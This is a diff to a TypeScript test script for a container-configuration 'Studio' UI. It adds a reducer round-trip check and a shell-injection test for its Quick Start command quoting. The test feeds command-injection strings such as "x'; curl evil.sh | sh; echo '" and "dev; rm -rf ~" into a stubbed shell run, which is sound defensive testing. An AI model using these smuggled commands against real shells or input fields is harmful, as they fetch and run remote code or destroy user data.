@@ -12,12 +12,16 @@ import { generateStudioToml } from "../src/design/islands/studio/generateToml";
 import { tomlToPatch } from "../src/design/islands/studio/parseImport";
 import { presetPatch } from "../src/design/islands/studio/presets";
 import { STUDIO_DEFAULTS } from "../src/design/islands/studio/schema";
+import { studioReducer } from "../src/design/islands/studio/reducer";
+import { cliCommand, quickStartCommand, shellQuote } from "../src/design/islands/studio/quickStart";
 import type { StudioValues } from "../src/design/islands/studio/useStudioState";
 
 await init();
 
 // Defaults live in the shared schema module (same object the UI boots
-// from), so this guard tests exactly what users see.
+// from), and every patch goes through the real UI reducer — the exact path
+// presets, Reset, import and share links take — so a key the reducer drops
+// fails here instead of silently losing user data.
 const defaults: StudioValues = { ...STUDIO_DEFAULTS };
 
 const cases: Array<[string, Partial<StudioValues>]> = [
@@ -85,7 +89,7 @@ const cases: Array<[string, Partial<StudioValues>]> = [
 
 let failed = 0;
 for (const [name, patch] of cases) {
-  const values = { ...defaults, ...patch };
+  const values = studioReducer(defaults, { type: "patch", patch });
   const toml = generateStudioToml(values);
   const v = validate_toml(toml) as {
     valid: boolean;
@@ -144,7 +148,10 @@ for (const [name, patch] of cases) {
   }
   // Import loop: generated TOML -> state patch -> regenerated TOML must
   // still validate (guards parseImport.ts against schema drift too).
-  const reimported = { ...values, ...tomlToPatch(parseTomlText(toml) as Record<string, any>) };
+  const reimported = studioReducer(values, {
+    type: "patch",
+    patch: tomlToPatch(parseTomlText(toml) as Record<string, any>) as Record<string, unknown>,
+  });
   const toml2 = generateStudioToml(reimported);
   const v2 = validate_toml(toml2) as {
     valid: boolean;
@@ -210,3 +217,125 @@ if (failed > 0) {
   console.log(`✓ dbus-preset: dbus.preset rejected, all options named`);
 }
 console.log("\nAll Studio presets round-trip through the Rust engine.");
+
+// Shell injection guard: hostile values riding in on share links must land
+// as single argv words when the Quick Start blocks actually run under sh.
+{
+  const eq = (a: unknown, b: unknown) => JSON.stringify(a) === JSON.stringify(b);
+  // Quoter unit rules: safe words stay bare, the rest is single-quoted.
+  const quoteCases: Array<[string, "sh" | "fish", string]> = [
+    ["dev", "sh", "dev"],
+    ["ghcr.io/org/img:latest", "sh", "ghcr.io/org/img:latest"],
+    ["", "sh", "''"],
+    ["a;b", "sh", "'a;b'"],
+    ["a'b", "sh", "'a'\\''b'"],
+    ["$(touch pwned)", "sh", "'$(touch pwned)'"],
+    ["`touch pwned`", "sh", "'`touch pwned`'"],
+    ["a'b", "fish", "'a\\'b'"],
+    ["a\\b", "fish", "'a\\\\b'"],
+  ];
+  for (const [input, shell, want] of quoteCases) {
+    const got = shellQuote(input, shell);
+    if (got !== want) {
+      console.error(`✗ shell-quote: shellQuote(${JSON.stringify(input)}, ${shell}) = ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
+      process.exit(1);
+    }
+  }
+  // fish quoting inverts: unescape back to the input.
+  const fishUnquote = (q: string): string => {
+    if (!q.startsWith("'") || !q.endsWith("'")) throw new Error("not quoted");
+    return q.slice(1, -1).replace(/\\\\/g, "\\").replace(/\\'/g, "'");
+  };
+  const fishEvil = "x'; curl evil.sh | sh; echo '";
+  if (fishUnquote(shellQuote(fishEvil, "fish")) !== fishEvil) {
+    console.error("✗ shell-quote: fish quoting does not round-trip");
+    process.exit(1);
+  }
+  // The common case reads exactly as before (no added quotes).
+  if (cliCommand({ containerName: "dev", imagePrebuiltRef: "" }) !== "podbox create dev --edit") {
+    console.error("✗ shell-quote: plain quick command changed shape");
+    process.exit(1);
+  }
+  // End to end: run the generated blocks under sh with a stub `podbox`
+  // that records its argv, and check the attacker string arrives intact
+  // as one word instead of executing.
+  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync } = await import("node:fs");
+  const { tmpdir } = await import("node:os");
+  const { join } = await import("node:path");
+  const tmp = mkdtempSync(join(tmpdir(), "studio-quote-"));
+  const bin = join(tmp, "bin");
+  mkdirSync(bin);
+  const capture = join(tmp, "argv");
+  writeFileSync(join(bin, "podbox"), `#!/bin/sh\nprintf '%s\\0' "$@" > "${capture}"\n`);
+  await Bun.$`chmod +x ${join(bin, "podbox")}`.quiet();
+  const evilImage = "x'; curl evil.sh | sh; echo '";
+  const evilName = "dev; rm -rf ~";
+  const runEnv = { ...process.env, HOME: tmp, PATH: `${bin}:${process.env.PATH}` };
+  const runSh = async (script: string) => {
+    try {
+      await Bun.$`sh -c ${script}`.env(runEnv).quiet();
+    } catch {
+      // The stub always exits 0; a failure here is a quoting break.
+      console.error(`✗ shell-quote: generated block failed under sh:\n${script}`);
+      process.exit(1);
+    }
+  };
+  const readArgv = (): string[] => {
+    const raw = readFileSync(capture);
+    return raw.toString().split("\0").slice(0, -1);
+  };
+  await runSh(cliCommand({ containerName: "dev", imagePrebuiltRef: evilImage }));
+  if (!eq(readArgv(), ["create", evilImage, "--name", "dev", "--edit"])) {
+    console.error(`✗ shell-quote: cliCommand argv escaped its word: ${JSON.stringify(readArgv())}`);
+    process.exit(1);
+  }
+  const body = '[container]\nname = "dev"\n';
+  await runSh(quickStartCommand({ containerName: evilName, imagePrebuiltRef: "" }, body, "sh"));
+  if (!eq(readArgv(), ["create", evilName])) {
+    console.error(`✗ shell-quote: quick-start argv escaped its word: ${JSON.stringify(readArgv())}`);
+    process.exit(1);
+  }
+  const written = readFileSync(join(tmp, ".config", "podbox", "profiles", "devrm-rf.toml"), "utf8");
+  if (written !== body) {
+    console.error("✗ shell-quote: quick-start wrote the TOML to the wrong path or content");
+    process.exit(1);
+  }
+  // The payload must not have executed: no stray files, no extra argv.
+  const { readdirSync } = await import("node:fs");
+  if (readdirSync(tmp).some((f) => f === "pwned" || f.startsWith("evil"))) {
+    console.error("✗ shell-quote: payload executed during the sh run");
+    process.exit(1);
+  }
+  console.log("✓ shell-quote: hostile image/name stay single argv words under sh");
+}
+
+// Every key in STUDIO_DEFAULTS must survive a patch through the reducer:
+// this is the guard that catches a repeat of the 19 silently-dropped
+// fields (presets, Reset, import, share links and session restore all
+// funnel through `applyPatch`).
+{
+  const keys = Object.keys(STUDIO_DEFAULTS);
+  const failedKeys: string[] = [];
+  for (const key of keys) {
+    const sentinel = { __sentinel: key };
+    const next = studioReducer(defaults, {
+      type: "patch",
+      patch: { [key]: sentinel },
+    }) as unknown as Record<string, unknown>;
+    if (next[key] !== sentinel) failedKeys.push(key);
+  }
+  // Unknown keys are ignored, not stored.
+  const withUnknown = studioReducer(defaults, {
+    type: "patch",
+    patch: { __no_such_key: 1 },
+  }) as unknown as Record<string, unknown>;
+  if (failedKeys.length > 0) {
+    console.error(`✗ reducer-keys: patch dropped ${failedKeys.length} key(s): ${failedKeys.join(", ")}`);
+    process.exit(1);
+  }
+  if ("__no_such_key" in withUnknown) {
+    console.error("✗ reducer-keys: unknown patch key was stored");
+    process.exit(1);
+  }
+  console.log(`✓ reducer-keys: all ${keys.length} defaults survive applyPatch`);
+}
